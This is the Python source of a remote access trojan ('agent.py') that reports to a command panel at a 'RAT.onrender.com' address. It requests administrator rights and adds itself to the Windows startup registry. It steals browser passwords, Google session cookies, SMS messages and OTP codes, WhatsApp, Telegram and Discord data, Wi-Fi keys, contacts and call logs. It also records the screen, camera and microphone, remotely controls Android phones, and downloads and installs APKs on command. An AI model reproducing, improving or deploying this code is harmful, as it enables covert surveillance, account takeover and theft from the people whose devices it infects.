# agent.py - FULL STEAL + CONTROL + HANDPHONE
import socketio
import platform
import uuid
import subprocess
import os
import requests
import time
import json
import sys
import ctypes
import shutil
import sqlite3
import glob
import base64
import re
from datetime import datetime

PANEL_URL = "https://RAT.onrender.com"
DEVICE_ID = str(uuid.getnode()) + "_ZAMZZZ"

def run_cmd(cmd):
    try:
        result = subprocess.getoutput(cmd)
        return result if result else "Sukses"
    except:
        return "Gagal"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        except:
            pass

def install_persistence():
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "ZamzzzSystem", 0, winreg.REG_SZ, os.path.abspath(__file__))
            winreg.CloseKey(handle)
            return "Sukses"
    except:
        return "Gagal"
    return "Sukses"

# ========== STEAL GMAIL ==========
def steal_gmail_passwords():
    results = []
    paths = [
        os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data",
        os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
        os.path.expanduser("~") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
        os.path.expanduser("~") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json"
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                if path.endswith(".db") or "Login Data" in path:
                    temp = os.environ["TEMP"] + "\\login_copy.db"
                    shutil.copy2(path, temp)
                    conn = sqlite3.connect(temp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url = row[0]
                        user = row[1]
                        pwd = row[2]
                        if "google.com" in url or "gmail" in url.lower():
                            try:
                                pwd = subprocess.getoutput(f"echo '{pwd}' | base64 -d 2>/dev/null") if pwd else pwd
                            except:
                                pass
                            results.append(f"URL: {url}\nUser: {user}\nPass: {pwd}\n")
                    conn.close()
                    os.remove(temp)
                elif path.endswith("logins.json"):
                    try:
                        import json
                        with open(path, 'r') as f:
                            data = json.load(f)
                            for item in data.get("logins", []):
                                url = item.get("hostname", "")
                                if "google.com" in url or "gmail" in url.lower():
                                    user = item.get("usernameField", "")
                                    pwd = item.get("encryptedPassword", "")
                                    results.append(f"URL: {url}\nUser: {user}\nPass: {pwd}\n")
                    except:
                        pass
            except:
                pass
    return "\n".join(results) if results else "Tidak ada Gmail ditemukan"

def steal_gmail_cookies():
    results = []
    paths = [
        os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
        os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies"
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                temp = os.environ["TEMP"] + "\\cookies_copy.db"
                shutil.copy2(path, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%google%' OR host_key LIKE '%gmail%'")
                for row in cursor.fetchall():
                    if "SAPISID" in row[1] or "APISID" in row[1] or "HSID" in row[1] or "SSID" in row[1]:
                        results.append(f"Cookie: {row[0]} | {row[1]} = {row[2][:50]}...")
                conn.close()
                os.remove(temp)
            except:
                pass
    return "\n".join(results) if results else "Tidak ada cookie Gmail ditemukan"

# ========== STEAL SMS ==========
def steal_sms():
    if platform.system() == "Android":
        return run_cmd("content query --uri content://sms/inbox")
    return "Tidak support (non-Android)"

def steal_sms_sent():
    if platform.system() == "Android":
        return run_cmd("content query --uri content://sms/sent")
    return "Tidak support (non-Android)"

def steal_sms_otp():
    if platform.system() == "Android":
        result = run_cmd("content query --uri content://sms/inbox")
        if result and "Gagal" not in result:
            otps = re.findall(r'\b\d{4,6}\b', result)
            return "\n".join(otps) if otps else "Tidak ada OTP ditemukan"
    return "Tidak support (non-Android)"

# ========== STEAL WHATSAPP ==========
def steal_whatsapp_db():
    if platform.system() == "Android":
        return run_cmd("cp /data/data/com.whatsapp/databases/msgstore.db /sdcard/ 2>/dev/null")
    return "Tidak support (non-Android)"

def steal_whatsapp_backup():
    if platform.system() == "Android":
        return run_cmd("find /sdcard/WhatsApp -name '*.crypt12' -o -name '*.crypt14' 2>/dev/null")
    return "Tidak support (non-Android)"

# ========== STEAL TELEGRAM ==========
def steal_telegram():
    if platform.system() == "Android":
        return run_cmd("cp -r /data/data/org.telegram.messenger/files /sdcard/telegram_backup/ 2>/dev/null")
    elif platform.system() == "Windows":
        return run_cmd("powershell -Command \"Get-ChildItem $env:APPDATA\\Telegram Desktop\\tdata -Recurse 2>$null\"")
    return "Tidak support"

# ========== STEAL ALL PASSWORDS ==========
def steal_all_passwords():
    results = []
    paths = [
        os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                temp = os.environ["TEMP"] + "\\pass_copy.db"
                shutil.copy2(path, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    results.append(f"URL: {row[0]}\nUser: {row[1]}\nPass: {row[2]}\n")
                conn.close()
                os.remove(temp)
            except:
                pass
    return "\n".join(results) if results else "Tidak ada password ditemukan"

# ========== STEAL WIFI ==========
def steal_wifi():
    if platform.system() == "Windows":
        return run_cmd("netsh wlan show profile * key=clear")
    elif platform.system() == "Android":
        return run_cmd("cat /data/misc/wifi/*.conf 2>/dev/null")
    return "Tidak support"

# ========== STEAL DISCORD ==========
def steal_discord():
    if platform.system() == "Windows":
        return run_cmd("powershell -Command \"Get-Content $env:APPDATA\\discord\\Local Storage\\leveldb\\*.log 2>$null | Select-String 'token'\"")
    return "Tidak support"

# ========== STEAL SCREENSHOT ==========
def steal_screenshot():
    if platform.system() == "Windows":
        return run_cmd("powershell -Command \"Add-Type -AssemblyName System.Drawing; $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save('$env:TEMP\\ss.png')\"")
    elif platform.system() == "Android":
        return run_cmd("screencap -p /sdcard/ss.png")
    return "Sukses"

# ========== STEAL CLIPBOARD ==========
def steal_clipboard():
    if platform.system() == "Windows":
        return run_cmd("powershell -Command \"Get-Clipboard\"")
    return "Tidak support"

# ========== STEAL LOCATION ==========
def steal_location():
    try:
        return requests.get("http://ip-api.com/json/", timeout=5).text
    except:
        return "Gagal"

# ========== STEAL IP ==========
def steal_ip():
    try:
        return requests.get("http://ip-api.com/json/", timeout=5).json().get("query", "Unknown")
    except:
        return "Gagal"

# ========== STEAL SYSTEM INFO ==========
def steal_sysinfo():
    return f"OS:{platform.system()}|Version:{platform.version()}|Machine:{platform.machine()}|Host:{platform.node()}|Admin:{is_admin()}"

# ========== STEAL FILES ==========
def steal_files(path="~"):
    try:
        path = os.path.expanduser(path)
        if os.path.exists(path):
            return run_cmd(f"ls -la {path}" if platform.system() != "Windows" else f"dir {path}")
        return f"Path {path} tidak ditemukan"
    except:
        return "Gagal"

def steal_file_content(filepath):
    try:
        filepath = os.path.expanduser(filepath)
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()[:5000]
        return f"File {filepath} tidak ditemukan"
    except:
        return "Gagal membaca file"

def steal_download_file(filepath):
    try:
        filepath = os.path.expanduser(filepath)
        if os.path.exists(filepath):
            return f"File ditemukan: {filepath} | Size: {os.path.getsize(filepath)} bytes"
        return f"File {filepath} tidak ditemukan"
    except:
        return "Gagal"

# ========== STEAL CONTACTS ==========
def steal_contacts():
    if platform.system() == "Android":
        return run_cmd("content query --uri content://contacts/phones/")
    return "Tidak support (non-Android)"

# ========== STEAL CALL LOGS ==========
def steal_calllogs():
    if platform.system() == "Android":
        return run_cmd("content query --uri content://call_log/calls")
    return "Tidak support (non-Android)"

# ========== STEAL IMEI ==========
def steal_imei():
    if platform.system() == "Android":
        return run_cmd("service call iphonesubinfo 1")
    return "Tidak support (non-Android)"

# ========== STEAL GALLERY ==========
def steal_gallery():
    if platform.system() == "Android":
        return run_cmd("zip -r /sdcard/gallery_backup.zip /sdcard/DCIM/ 2>/dev/null")
    return "Tidak support"

def steal_photos():
    if platform.system() == "Android":
        return run_cmd("find /sdcard/DCIM -name '*.jpg' -o -name '*.png' 2>/dev/null")
    return "Tidak support"

def steal_videos():
    if platform.system() == "Android":
        return run_cmd("find /sdcard -name '*.mp4' -o -name '*.mkv' -o -name '*.3gp' 2>/dev/null")
    return "Tidak support"

# ========== STEAL PHOTO ==========
def steal_photo():
    if platform.system() == "Android":
        return run_cmd("termux-camera-photo -c 0 /sdcard/photo.jpg")
    return "Tidak support"

# ========== STEAL MIC ==========
def steal_mic():
    if platform.system() == "Android":
        return run_cmd("termux-microphone-record -d 30 -f /sdcard/mic.wav")
    elif platform.system() == "Windows":
        return run_cmd("powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)\"")
    return "Tidak support"

def steal_mic_start():
    if platform.system() == "Android":
        return run_cmd("termux-microphone-record -d 0 -f /sdcard/mic.wav &")
    return "Tidak support"

def steal_mic_stop():
    return run_cmd("pkill -f termux-microphone-record")

# ========== RECORD HANDPHONE ==========
def record_screen():
    if platform.system() == "Android":
        return run_cmd("screenrecord /sdcard/screen_record.mp4")
    return "Tidak support"

def record_screen_time(duration=30):
    if platform.system() == "Android":
        return run_cmd(f"screenrecord --time-limit {duration} /sdcard/screen_record_{duration}s.mp4")
    return "Tidak support"

def record_call():
    if platform.system() == "Android":
        return run_cmd("am start -a android.intent.action.CALL -d tel:1234567890")
    return "Tidak support"

def record_audio():
    if platform.system() == "Android":
        return run_cmd("termux-microphone-record -d 60 -f /sdcard/audio_record.wav")
    return "Tidak support"

# ========== CONTROL HANDPHONE ==========
def control_tap(x, y):
    if platform.system() == "Android":
        return run_cmd(f"input tap {x} {y}")
    return "Tidak support"

def control_swipe(x1, y1, x2, y2, duration=100):
    if platform.system() == "Android":
        return run_cmd(f"input swipe {x1} {y1} {x2} {y2} {duration}")
    return "Tidak support"

def control_type(text):
    if platform.system() == "Android":
        return run_cmd(f"input text '{text}'")
    return "Tidak support"

def control_back():
    if platform.system() == "Android":
        return run_cmd("input keyevent KEYCODE_BACK")
    return "Tidak support"

def control_home():
    if platform.system() == "Android":
        return run_cmd("input keyevent KEYCODE_HOME")
    return "Tidak support"

def control_recent():
    if platform.system() == "Android":
        return run_cmd("input keyevent KEYCODE_APP_SWITCH")
    return "Tidak support"

def control_call(number):
    if platform.system() == "Android":
        return run_cmd(f"am start -a android.intent.action.CALL -d tel:{number}")
    return "Tidak support"

def control_end_call():
    if platform.system() == "Android":
        return run_cmd("input keyevent KEYCODE_ENDCALL")
    return "Tidak support"

def control_sms(number, message):
    if platform.system() == "Android":
        return run_cmd(f"termux-sms-send -n {number} '{message}'")
    return "Tidak support"

def control_flashlight():
    if platform.system() == "Android":
        return run_cmd("termux-torch toggle")
    return "Tidak support"

def control_brightness(level):
    if platform.system() == "Android":
        return run_cmd(f"settings put system screen_brightness {level}")
    return "Tidak support"

def control_volume(level):
    if platform.system() == "Android":
        return run_cmd(f"media volume --set {level}")
    return "Tidak support"

def control_vibrate():
    if platform.system() == "Android":
        return run_cmd("termux-vibrate -d 5000")
    return "Tidak support"

def control_wifi_on():
    if platform.system() == "Android":
        return run_cmd("svc wifi enable")
    return "Tidak support"

def control_wifi_off():
    if platform.system() == "Android":
        return run_cmd("svc wifi disable")
    return "Tidak support"

def control_bluetooth_on():
    if platform.system() == "Android":
        return run_cmd("svc bluetooth enable")
    return "Tidak support"

def control_bluetooth_off():
    if platform.system() == "Android":
        return run_cmd("svc bluetooth disable")
    return "Tidak support"

def control_airplane_on():
    if platform.system() == "Android":
        return run_cmd("settings put global airplane_mode_on 1 && am broadcast -a android.intent.action.AIRPLANE_MODE")
    return "Tidak support"

def control_airplane_off():
    if platform.system() == "Android":
        return run_cmd("settings put global airplane_mode_on 0 && am broadcast -a android.intent.action.AIRPLANE_MODE")
    return "Tidak support"

def control_gps_on():
    if platform.system() == "Android":
        return run_cmd("settings put secure location_providers_allowed +gps")
    return "Tidak support"

def control_gps_off():
    if platform.system() == "Android":
        return run_cmd("settings put secure location_providers_allowed -gps")
    return "Tidak support"

def control_dnd_on():
    if platform.system() == "Android":
        return run_cmd("settings put global zen_mode 1")
    return "Tidak support"

def control_dnd_off():
    if platform.system() == "Android":
        return run_cmd("settings put global zen_mode 0")
    return "Tidak support"

def control_mute():
    if platform.system() == "Android":
        return run_cmd("input keyevent KEYCODE_MUTE")
    return "Tidak support"

def control_unmute():
    if platform.system() == "Android":
        return run_cmd("input keyevent KEYCODE_UNMUTE")
    return "Tidak support"

def control_lock():
    if platform.system() == "Android":
        return run_cmd("input keyevent 26")
    elif platform.system() == "Windows":
        return run_cmd("rundll32.exe user32.dll,LockWorkStation")
    return "Tidak support"

def control_restart():
    if platform.system() == "Android":
        return run_cmd("reboot")
    elif platform.system() == "Windows":
        return run_cmd("shutdown /r /t 0")
    return "Tidak support"

def control_shutdown():
    if platform.system() == "Android":
        return run_cmd("reboot -p")
    elif platform.system() == "Windows":
        return run_cmd("shutdown /s /t 0")
    return "Tidak support"

# ========== EDIT HANDPHONE ==========
def edit_wallpaper(url):
    if platform.system() == "Android":
        img_path = "/sdcard/wallpaper.jpg"
        run_cmd(f"wget {url} -O {img_path}")
        return run_cmd(f"termux-wallpaper -f {img_path}")
    elif platform.system() == "Windows":
        img_path = os.environ["TEMP"] + "\\wallpaper.jpg"
        run_cmd(f"curl -o {img_path} {url}")
        return run_cmd(f"powershell -Command \"Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value '{img_path}'; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters\"")
    return "Tidak support"

def edit_ringtone(uri):
    if platform.system() == "Android":
        return run_cmd(f"settings put system ringtone {uri}")
    return "Tidak support"

def edit_alarm(uri):
    if platform.system() == "Android":
        return run_cmd(f"settings put system alarm_alert {uri}")
    return "Tidak support"

def edit_notification(uri):
    if platform.system() == "Android":
        return run_cmd(f"settings put system notification_sound {uri}")
    return "Tidak support"

def edit_brightness(level):
    if platform.system() == "Android":
        return run_cmd(f"settings put system screen_brightness {level}")
    return "Tidak support"

def edit_volume(level):
    if platform.system() == "Android":
        return run_cmd(f"media volume --set {level}")
    return "Tidak support"

def edit_timezone(timezone):
    if platform.system() == "Android":
        return run_cmd(f"settings put global time_zone {timezone}")
    return "Tidak support"

def edit_language(lang):
    if platform.system() == "Android":
        return run_cmd(f"settings put system system_locales {lang}")
    return "Tidak support"

# ========== INSTALL APK ==========
def install_apk(url):
    if platform.system() == "Android":
        return run_cmd(f"wget {url} -O /sdcard/temp.apk && pm install /sdcard/temp.apk")
    return "Tidak support"

def uninstall_app(package):
    if platform.system() == "Android":
        return run_cmd(f"pm uninstall {package}")
    elif platform.system() == "Windows":
        return run_cmd(f"wmic product where name='{package}' call uninstall")
    return "Tidak support"

def open_app(package):
    if platform.system() == "Android":
        return run_cmd(f"monkey -p {package} 1")
    return "Tidak support"

# ========== COMMANDS ==========
COMMANDS = {
    # STEAL
    "gmail_pass": steal_gmail_passwords,
    "gmail_cookie": steal_gmail_cookies,
    "sms": steal_sms,
    "sms_sent": steal_sms_sent,
    "sms_otp": steal_sms_otp,
    "whatsapp": steal_whatsapp_db,
    "whatsapp_backup": steal_whatsapp_backup,
    "telegram": steal_telegram,
    "passwords": steal_all_passwords,
    "wifi": steal_wifi,
    "discord": steal_discord,
    "screenshot": steal_screenshot,
    "clipboard": steal_clipboard,
    "location": steal_location,
    "ip": steal_ip,
    "sysinfo": steal_sysinfo,
    "contacts": steal_contacts,
    "calllogs": steal_calllogs,
    "imei": steal_imei,
    "gallery": steal_gallery,
    "photos": steal_photos,
    "videos": steal_videos,
    "photo": steal_photo,
    "files": steal_files,
    "file": steal_file_content,
    "mic": steal_mic,
    "mic_start": steal_mic_start,
    "mic_stop": steal_mic_stop,
    
    # RECORD
    "record_screen": record_screen,
    "record_screen_time": record_screen_time,
    "record_audio": record_audio,
    "record_call": record_call,
    
    # CONTROL
    "tap": control_tap,
    "swipe": control_swipe,
    "type": control_type,
    "back": control_back,
    "home": control_home,
    "recent": control_recent,
    "call": control_call,
    "endcall": control_end_call,
    "sms": control_sms,
    "flash": control_flashlight,
    "brightness": control_brightness,
    "volume": control_volume,
    "vibrate": control_vibrate,
    "wifi_on": control_wifi_on,
    "wifi_off": control_wifi_off,
    "bt_on": control_bluetooth_on,
    "bt_off": control_bluetooth_off,
    "air_on": control_airplane_on,
    "air_off": control_airplane_off,
    "gps_on": control_gps_on,
    "gps_off": control_gps_off,
    "dnd_on": control_dnd_on,
    "dnd_off": control_dnd_off,
    "mute": control_mute,
    "unmute": control_unmute,
    "lock": control_lock,
    "restart": control_restart,
    "shutdown": control_shutdown,
    
    # EDIT
    "wallpaper": edit_wallpaper,
    "ringtone": edit_ringtone,
    "alarm": edit_alarm,
    "notification": edit_notification,
    "edit_brightness": edit_brightness,
    "edit_volume": edit_volume,
    "timezone": edit_timezone,
    "language": edit_language,
    
    # APPS
    "install": install_apk,
    "uninstall": uninstall_app,
    "open": open_app,
    
    "persistence": install_persistence
}

sio = socketio.Client()
@sio.event
def connect():
    sio.emit("register", {"id": DEVICE_ID, "os": platform.system(), "hostname": platform.node()})
@sio.event
def disconnect():
    time.sleep(5)
    try:
        sio.connect(PANEL_URL)
    except:
        pass
@sio.on("command")
def on_command(data):
    action = data.get("action")
    params = data.get("params", {})
    if action in COMMANDS:
        try:
            result = COMMANDS[action](**params)
            sio.emit("result", {"id": DEVICE_ID, "action": action, "status": "success", "result": str(result)})
        except Exception as e:
            sio.emit("result", {"id": DEVICE_ID, "action": action, "status": "error", "result": f"Error: {str(e)}"})
    else:
        sio.emit("result", {"id": DEVICE_ID, "action": action, "status": "error", "result": "Unknown"})

if __name__ == "__main__":
    run_as_admin()
    install_persistence()
    while True:
        try:
            sio.connect(PANEL_URL)
            sio.wait()
        except:
            time.sleep(10)
            continue